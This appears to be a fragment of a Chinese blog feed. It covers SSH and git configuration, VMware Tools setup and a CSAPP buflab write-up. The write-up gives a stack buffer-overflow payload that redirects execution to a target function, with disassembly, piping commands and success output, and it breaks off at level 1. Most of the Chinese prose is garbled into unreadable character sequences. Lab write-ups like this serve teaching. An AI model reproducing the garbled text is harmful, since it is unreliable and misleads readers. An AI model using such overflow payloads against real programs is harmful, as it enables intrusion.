class="hljs-string">&quot;C:\Users\philo\.ssh\wdnmd&quot;</span> <span class="hljs-comment"># ç§é’¥</span><br>  Port <span class="hljs-number">443</span><br><br>  Host zara<br>  HostName <span class="hljs-number">82.157</span>.<span class="hljs-number">64.229</span><br>  <span class="hljs-keyword">User</span> <span class="hljs-title">zarathustra</span><br>  IdentityFile <span class="hljs-string">&quot;C:\Users\philo\.ssh\zara&quot;</span> <span class="hljs-comment"># ç§é’¥</span><br><br>Host *<br>    ServerAliveInterval <span class="hljs-number">180</span> <span class="hljs-comment"># sshè¿æ¥é€‰é¡¹ ä½¿SSHè¿æ¥çš„æœåŠ¡å™¨ä¿æŒæ´»åŠ¨é—´éš”ï¼Œè¡¨ç¤ºæ¯180ç§’ï¼ˆ3åˆ†é’Ÿï¼‰å‘é€ä¸€ä¸ªä¿æŒæ´»åŠ¨çš„è¯·æ±‚åˆ°æœåŠ¡å™¨</span><br></code></pre></td></tr></table></figure><h2 id="githubè®¾ç½®"><a href="#githubè®¾ç½®" class="headerlink" title="githubè®¾ç½®"></a>githubè®¾ç½®</h2><p>åœ¨<a href="https://github.com/settings/keys%E5%8F%AF%E4%BB%A5%E6%B7%BB%E5%8A%A0ssh%E5%85%AC%E9%92%A5">https://github.com/settings/keyså¯ä»¥æ·»åŠ sshå…¬é’¥</a></p><p><img src="https://img.gls.show/img/20230727205401.png"></p><p>é…ç½®å®Œè¿™ä¸ªä¹‹åï¼Œåœ¨å‘½ä»¤è¡Œè®¾ç½®ä¸€ä¸‹gité‚®ç®±å’Œç”¨æˆ·åï¼Œå³å¯å°†ä»“åº“æ¨é€åˆ°è¿œç¨‹</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">git</span> <span class="hljs-string">config</span> <span class="hljs-built_in">--global</span> <span class="hljs-string">user</span>.<span class="hljs-string">name</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-comment"># è®¾ç½® ç”¨æˆ·å</span><br><br><span class="hljs-string">git</span> <span class="hljs-string">config</span> <span class="hljs-built_in">--global</span> <span class="hljs-string">user</span>.<span class="hljs-string">email</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-comment"># è®¾ç½® é‚®ç®±</span><br><br><span class="hljs-string">git</span> <span class="hljs-string">config</span> <span class="hljs-built_in">--global</span> <span class="hljs-built_in">--l</span> <span class="hljs-comment"># æ˜¾ç¤ºè®¾ç½®</span><br></code></pre></td></tr></table></figure><h1 id="å®‰è£…VMware-tools"><a href="#å®‰è£…VMware-tools" class="headerlink" title="å®‰è£…VMware tools"></a><strong>å®‰è£…VMware tools</strong></h1><p><strong>Windowsä¸‹å®‰è£…</strong></p><p>èœå•-ã€‹è™šæ‹Ÿæœº-ã€‹å®‰è£…VMware tools-ã€‹è¹¦å‡ºæ¥<code>D:\setup.exe</code>-ã€‹æ‰“å¼€å®‰è£…ç¨‹åº-ã€‹é¡ºç€å®‰è£…ç¨‹åºä¸€è·¯ç‚¹ç‚¹ç‚¹å®Œæˆå®‰è£…</p><p><strong>linuxä¸‹å®‰è£…</strong></p><ul><li>å¤åˆ¶åˆ°æ¡Œé¢</li><li><strong>Ctrt+Ait+T</strong>å¿«æ·æ‰“å¼€ç»ˆç«¯</li><li>tar zxvf è§£å‹æ–‡ä»¶</li><li>è¿›å…¥æ–‡ä»¶å¤¹ï¼Œåˆ‡æ¢ä¸ºrootï¼Œ./xxx.plå®‰è£…vmware tools</li><li>å‘ç°è¿˜æ˜¯æ²¡æ³•ç”¨ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤è§£å†³<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo apt-<span class="hljs-built_in">get</span> autoremove <span class="hljs-keyword">open</span>-<span class="hljs-keyword">vm</span>-tools<br>sudo apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">open</span>-<span class="hljs-keyword">vm</span>-tools<br>sudo apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">open</span>-<span class="hljs-keyword">vm</span>-tools-desktop<br></code></pre></td></tr></table></figure>å¦‚æœé‡åˆ°è¿è¡Œä¸Šè¿°å‘½ä»¤å¤±è´¥ï¼Œå…ˆè¿è¡Œapt update</li></ul><p>å¦‚æœé‡åˆ°é—®é¢˜ï¼šæ— æ³•å¤åˆ¶ç²˜è´´ï¼Œå¹¶ä¸”é‡æ–°å®‰è£…VMware Toolsé€‰é¡¹æ˜¾ç¤ºç°è‰²</p><p>è§£å†³åŠæ³•ï¼šå…³æœºï¼Œè®¾ç½®é‡Œé¢æ·»åŠ è½¯ç›˜å’Œcdï¼Œå¼€æœºå³å¯</p><p><strong>é…ç½®cpuæ•°é‡</strong></p><p>Vmwareæ ¸å¿ƒå¤„ç†å™¨åŠå†…æ ¸æ•°é‡ç›¸å…³æ¦‚å¿µï¼š<a href="https://www.cnblogs.com/gambler/p/13227652.html">https://www.cnblogs.com/gambler/p/13227652.html</a></p><h1 id="å®‰è£…Windowsè™šæ‹Ÿæœº"><a href="#å®‰è£…Windowsè™šæ‹Ÿæœº" class="headerlink" title="å®‰è£…Windowsè™šæ‹Ÿæœº"></a>å®‰è£…Windowsè™šæ‹Ÿæœº</h1><p><strong>æ–°å»ºè™šæ‹Ÿæœº</strong></p><ul><li>æ–°å»ºé€‰é¡¹-ã€‹ç¨åå®‰è£…æ“ä½œç³»ç»Ÿ-ã€‹åˆ†é…CPUã€å†…å­˜ç­‰ç­‰ä¸€æ­¥ä¸€æ­¥ç‚¹å°±è¡Œ-ã€‹æœ€åç›´æ¥ç‚¹å‡»å¯åŠ¨ï¼Œä¼šå¼¹å‡ºä¸€ä¸ªçª—å£è®©ä½ é€‰æ‹©isoæ–‡ä»¶</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP-lab3ï¼šbuflab</title>
    <link href="/p/db3828d1/"/>
    <url>/p/db3828d1/</url>
    
    <content type="html"><![CDATA[<h1 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h1><blockquote><p>æ ¹æ®å®éªŒæ‰‹å†Œæ“ä½œ</p></blockquote><p>è§£å‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">tar xvf buflab-handout.tar<br></code></pre></td></tr></table></figure><p>å¾—åˆ°ä¸‰ä¸ªæ–‡ä»¶</p><ul><li>bufbomb <ul><li>äºŒè¿›åˆ¶ç‚¸å¼¹</li><li>-hé€‰é¡¹æ‰“å°å¸®åŠ©ä¿¡æ¯</li><li>-u userid è¿è¡Œï¼Œuseridä¼šæ”¹å˜ä¸€äº›ä»£ç åœ°å€</li></ul></li><li>makecookie <ul><li>æ ¹æ®idå®šåˆ¶cookie</li></ul></li><li>hex2raw<ul><li>å°†åå…­è¿›åˆ¶æ•°å­—è½¬åŒ–ä¸ºå¯¹åº”çš„ASCIIç </li></ul></li></ul><blockquote><p>set disassembly-flavor att è½¬æ¢ä¸ºattæ ¼å¼çš„æ±‡ç¼–</p></blockquote><h1 id="ç¨‹åºçš„åŸºæœ¬åˆ†æ"><a href="#ç¨‹åºçš„åŸºæœ¬åˆ†æ" class="headerlink" title="ç¨‹åºçš„åŸºæœ¬åˆ†æ"></a>ç¨‹åºçš„åŸºæœ¬åˆ†æ</h1><p>ç¨‹åºçš„è¿è¡Œæ–¹æ³•ï¼š</p><p>Usage: ./bufbomb -u <code>&lt;userid&gt;</code> [-nsh]<br>  -u <code>&lt;userid&gt;</code> User ID<br>  -n          Nitro mode<br>  -s          Submit your solution to the grading server<br>  -h          Print help information</p><p>çœ‹ä¸€ä¸‹ä¿æŠ¤</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; checksec<br>[*] <span class="hljs-string">&#x27;/home/kali/Desktop/bufbomb&#x27;</span><br>    Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      <span class="hljs-function">No <span class="hljs-title">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span></span><br><span class="hljs-function">    FORTIFY:  Enabled</span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure><ul><li>â€œNo PIE (0x8048000)â€ï¼Œè¿™è¡¨ç¤ºç¨‹åºæ˜¯ä»¥å›ºå®šçš„åŸºå€åŠ è½½åˆ°å†…å­˜ä¸­çš„ã€‚åœ°å€0x8048000æ˜¯ç¨‹åºçš„åŠ è½½åŸºå€ï¼Œä¹Ÿå°±æ˜¯ç¨‹åºåœ¨å†…å­˜ä¸­çš„èµ·å§‹åœ°å€ã€‚è¿™æ„å‘³ç€ç¨‹åºåœ¨æ¯æ¬¡è¿è¡Œæ—¶éƒ½ä¼šä»¥ç›¸åŒçš„åœ°å€åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œè€Œä¸æ˜¯ä»¥éšæœºçš„åŸºå€è¿›è¡Œåœ°å€é‡å®šä½ã€‚</li></ul><p>ç¨‹åºè¡Œä¸ºï¼š</p><ul><li>BUFBOMBç¨‹åºé€šè¿‡ä»¥ä¸‹å‡½æ•°ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–å­—ç¬¦ä¸²<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-comment">/* Buffer size for getbuf */</span><br><span class="hljs-number">2</span> <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NORMAL_BUFFER_SIZE 32</span><br><span class="hljs-number">3</span><br><span class="hljs-number">4</span> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getbuf</span><span class="hljs-params">()</span></span><br><span class="hljs-function">5 </span>&#123;<br><span class="hljs-number">6</span>  <span class="hljs-keyword">char</span> buf[NORMAL_BUFFER_SIZE];<br><span class="hljs-number">7</span>  Gets(buf);<br><span class="hljs-number">8</span>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-number">9</span> &#125;<br></code></pre></td></tr></table></figure></li><li>æ­¤å¤„å­˜åœ¨ç¼“å†²åŒºæº¢å‡º</li></ul><p>If the string  is no more than 31 characters long, it is clear that getbuf will return 1, as shown by the following execution example:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">unix&gt; ./bufbomb -u bovik<br>Type <span class="hljs-built_in">string</span>: I love <span class="hljs-number">15</span><span class="hljs-number">-213.</span><br>Dud: getbuf returned <span class="hljs-number">0x1</span><br></code></pre></td></tr></table></figure><p>An error occurs if we type a longer string:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">unix&gt; ./bufbomb -u bovik<br>Type <span class="hljs-built_in">string</span>: It is easier to love <span class="hljs-keyword">this</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">when</span> <span class="hljs-title">you</span> <span class="hljs-title">are</span> <span class="hljs-title">a</span> <span class="hljs-title">TA</span>.</span><br><span class="hljs-class"><span class="hljs-title">Ouch</span>!:</span> You caused a segmentation fault!<br></code></pre></td></tr></table></figure><p>ç”±äºæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²å¯èƒ½æœ‰ä¸å¯è§å­—ç¬¦ï¼ŒTAè´´å¿ƒçš„æä¾›äº†HEX2RAWå¸®ä½ ç”Ÿæˆè¿™ç±»å­—ç¬¦ä¸²ã€‚HEX2RAWç¨‹åºçš„è¾“å…¥æ˜¯å¾ˆå¤šä¸ªç”±ä¸¤ä¸ª16è¿›åˆ¶æ•°å­—ç»„æˆçš„å­—èŠ‚</p><p>â€œ012345â€ could be entered in hex format as â€œ30 31 32 33 34 35.â€ (Recall that the ASCII code for decimal digit x is 0x3x.)</p><p>å‡è®¾æˆ‘ä»¬è¾“å…¥äº†ï¼šbf 66 7b 32 78ï¼Œé‚£ä¹ˆä¸ä¹‹å¯¹åº”çš„ï¼š</p><p><strong>Raw Hex</strong>Â (zero bytes in bold):</p><p>BF667B3278Â Â Â </p><p><strong>String Literal:</strong></p><p>â€œ\xBF\x66\x7B\x32\x78â€</p><p><strong>Array Literal:</strong></p><p>{ 0xBF, 0x66, 0x7B, 0x32, 0x78 }</p><p>Disassembly:</p><p>0: Â bf 66 7b 32 78 Â  Â  Â  Â  Â mov Â  Â edi,0x78327b66</p><p>æˆ‘ä»¬éœ€è¦å°†æ­¤å†™åœ¨exploit.txtä¸­ï¼Œç„¶åä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ä¸bufbombäº¤äº’</p><ul><li>1ã€é‡å®šå‘ç¨‹åºè¾“å…¥</li><li>2ã€åœ¨gdbä¸­ç»™ç¨‹åºåŠ å‚æ•°</li></ul><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">1.</span> You can <span class="hljs-built_in">set</span> up <span class="hljs-keyword">a</span> series <span class="hljs-keyword">of</span> pipes <span class="hljs-built_in">to</span> pass <span class="hljs-keyword">the</span> <span class="hljs-keyword">string</span> through HEX2RAW.<br><br>unix&gt; cat exploit.txt | ./hex2raw | ./bufbomb -u bovik<br><br><span class="hljs-number">2.</span> You can store <span class="hljs-keyword">the</span> raw <span class="hljs-keyword">string</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">file</span> <span class="hljs-keyword">and</span> use I/O redirection <span class="hljs-built_in">to</span> supply <span class="hljs-keyword">it</span> <span class="hljs-built_in">to</span> BUFBOMB:<br><br>unix&gt; ./hex2raw &lt; exploit.txt &gt; exploit-raw.txt<br>unix&gt; ./bufbomb -u bovik &lt; exploit-raw.txt<br>This approach can also be used when running BUFBOMB <span class="hljs-built_in">from</span> <span class="hljs-keyword">within</span> GDB:<br>unix&gt; gdb bufbomb<br>(gdb) run -u bovik &lt; exploit-raw.txt<br></code></pre></td></tr></table></figure><h1 id="level-0-Candleï¼ˆ10-ptsï¼‰"><a href="#level-0-Candleï¼ˆ10-ptsï¼‰" class="headerlink" title="level 0 Candleï¼ˆ10 ptsï¼‰"></a>level 0 Candleï¼ˆ10 ptsï¼‰</h1><p>testå‡½æ•°ä¼šè°ƒç”¨getbufå‡½æ•°ï¼Œgetbufå‡½æ•°æ‰§è¡Œå®Œä¹‹åä¼šè¿”å›åˆ°testä¸­ç»§ç»­æ‰§è¡Œã€‚getbufå‡½æ•°å…·æœ‰ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œæˆ‘ä»¬éœ€è¦åŠ«æŒå‡½æ•°æ‰§è¡Œæµï¼Œä½¿å¾—ä»getbufå‡½æ•°è¿”å›åˆ°æˆ‘ä»¬æƒ³è¦çš„smokeå‡½æ•°å¤„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Buffer size for getbuf */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NORMAL_BUFFER_SIZE 32</span><br><br> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getbuf</span><span class="hljs-params">()</span></span><br><span class="hljs-function"> </span>&#123;<br>    <span class="hljs-keyword">char</span> buf[NORMAL_BUFFER_SIZE];<br>    Gets(buf);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br> &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> val;<br>    <span class="hljs-comment">/* Put canary on stack to detect possible corruption */</span><br>    <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">int</span> local = uniqueval();<br><br>    val = getbuf();<br><br>    <span class="hljs-comment">/* Check for corrupted stack */</span><br>    <span class="hljs-keyword">if</span> (local != uniqueval()) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sabotaged!: the stack has been corrupted\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (val == cookie) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Boom!: getbuf returned 0x%x\n&quot;</span>, val);<br>        validate(<span class="hljs-number">3</span>);<br>    &#125; <br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Dud: getbuf returned 0x%x\n&quot;</span>, val);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">smoke</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Smoke!: You called smoke()\n&quot;</span>);<br>    validate(<span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>smokeå‡½æ•°çš„åœ°å€ä¸º08048c18ï¼Œå› æ­¤éœ€è¦å°†è¿”å›åœ°å€è¦†ç›–å†™ä¸º08048c18</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">disas</span> smoke<br><br><span class="hljs-attribute">08048c18</span> &lt;smoke&gt;:<br> <span class="hljs-attribute">8048c18</span>:<span class="hljs-number">55</span>                   push   %ebp<br> <span class="hljs-attribute">8048c19</span>:<span class="hljs-number">89</span> e<span class="hljs-number">5</span>                mov    %esp,%ebp<br> <span class="hljs-attribute">8048c1b</span>:<span class="hljs-number">83</span> ec <span class="hljs-number">18</span>             sub    $<span class="hljs-number">0</span>x<span class="hljs-number">18</span>,%esp<br> <span class="hljs-attribute">8048c1e</span>:c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> d<span class="hljs-number">3</span> a<span class="hljs-number">4</span> <span class="hljs-number">04</span> <span class="hljs-number">08</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">804</span>a<span class="hljs-number">4</span>d<span class="hljs-number">3</span>,(%esp)<br> <span class="hljs-attribute">8048c25</span>:e<span class="hljs-number">8</span> <span class="hljs-number">96</span> fc ff ff       call   <span class="hljs-number">80488</span>c<span class="hljs-number">0</span> &lt;puts@plt&gt;<br> <span class="hljs-attribute">8048c2a</span>:c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,(%esp)<br> <span class="hljs-attribute">8048c31</span>:e<span class="hljs-number">8</span> <span class="hljs-number">45</span> <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       call   <span class="hljs-number">804937</span>b &lt;validate&gt;<br> <span class="hljs-attribute">8048c36</span>:c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,(%esp)<br> <span class="hljs-attribute">8048c3d</span>:e<span class="hljs-number">8</span> be fc ff ff       call   <span class="hljs-number">8048900</span> &lt;exit@plt&gt;<br></code></pre></td></tr></table></figure><p>getbufå‡½æ•°çš„æ ˆå¸§åˆ†é…äº†0x38å­—èŠ‚ï¼Œbufçš„é¦–åœ°å€åœ¨0x28åç§»å¤„ï¼Œå› æ­¤éœ€è¦å¡«å……buf+old ebpå¤§å°çš„ç©ºé—´ï¼Œç„¶åå°†è¿”å›åœ°å€è¦†ç›–</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">080491f4</span> &lt;getbuf&gt;:<br> <span class="hljs-attribute">80491f4</span>:<span class="hljs-number">55</span>                   push   %ebp<br> <span class="hljs-attribute">80491f5</span>:<span class="hljs-number">89</span> e<span class="hljs-number">5</span>                mov    %esp,%ebp<br> <span class="hljs-attribute">80491f7</span>:<span class="hljs-number">83</span> ec <span class="hljs-number">38</span>             sub    $<span class="hljs-number">0</span>x<span class="hljs-number">38</span>,%esp <br> <span class="hljs-attribute">80491fa</span>:<span class="hljs-number">8</span>d <span class="hljs-number">45</span> d<span class="hljs-number">8</span>             lea    -<span class="hljs-number">0</span>x<span class="hljs-number">28</span>(%ebp),%eax<br> <span class="hljs-attribute">80491fd</span>:<span class="hljs-number">89</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span>             mov    %eax,(%esp)<br> <span class="hljs-attribute">8049200</span>:e<span class="hljs-number">8</span> f<span class="hljs-number">5</span> fa ff ff       call   <span class="hljs-number">8048</span>cfa &lt;Gets&gt;<br> <span class="hljs-attribute">8049205</span>:b<span class="hljs-number">8</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,%eax<br> <span class="hljs-attribute">804920a</span>:c<span class="hljs-number">9</span>                   leave  <br> <span class="hljs-attribute">804920b</span>:c<span class="hljs-number">3</span>                   ret    <br><br></code></pre></td></tr></table></figure><p>æ ˆå¸§ç»“æ„å›¾</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><br><br> high         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>              â”‚           â”‚<br>              â”‚   cookie  â”‚<br>              â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>              â”‚           â”‚<br>              â”‚           â”‚<br>              â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>              â”‚           â”‚<br>              â”‚return <span class="hljs-keyword">addrâ”‚</span><br><span class="hljs-keyword"></span>              â”‚           â”‚<br>              â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>              â”‚           â”‚<br>ebp  â”€â”€â”€â”€â”€â–º   â”‚ old ebp   â”‚<br>              â”‚           â”‚<br>              â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>              â”‚           â”‚<br>              â”‚           â”‚<br>              â”‚   <span class="hljs-keyword">buf </span>    â”‚<br>              â”‚           â”‚<br>              â”‚           â”‚<br>              â”‚           â”‚<br>              â”‚           â”‚<br>              â”‚           â”‚<br>              â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>              â”‚           â”‚<br>              â”‚ ...<span class="hljs-keyword">buf[0] </span>â”‚<br>              â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br> low<br><br></code></pre></td></tr></table></figure><p>exploit.txt</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">50 </span><span class="hljs-number">8</span>b <span class="hljs-number">04</span> <span class="hljs-number">08</span> /*å°ç«¯åº*/<br></code></pre></td></tr></table></figure><p>è¾“å‡º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat exploit.txt | ./hex2raw  | ./bufbomb -u nmsl<br><br>Userid: nmsl<br>Cookie: 0x6185560e<br>Type string:Smoke!: You called smoke()<br>VALID<br>NICE JOB!<br></code></pre></td></tr></table></figure><h1 id="level-1-Sparklerï¼ˆ10-ptsï¼‰"><a href="#level-1-Sparklerï¼ˆ10-ptsï¼‰" class="headerlink" title="level 1 Sparklerï¼ˆ10 ptsï¼‰"></a>level 1 Sparklerï¼ˆ10 ptsï¼‰</h1><p>æ‰§è¡Œfizzå‡½æ•°ï¼Œä¸”è¯¥å‡½æ•°æœ‰ä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿå³æ˜¯åœ¨level 0çš„åŸºç¡€ä¸ŠåŠ äº†ä¸€ä¸ªå‡½æ•°å‚æ•°</p><p>æˆ‘çš„cookieï¼š0x6185560e</p><p>åæ±‡ç¼–å¾—åˆ°fizzçš„åœ°å€ï¼š08048c42</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 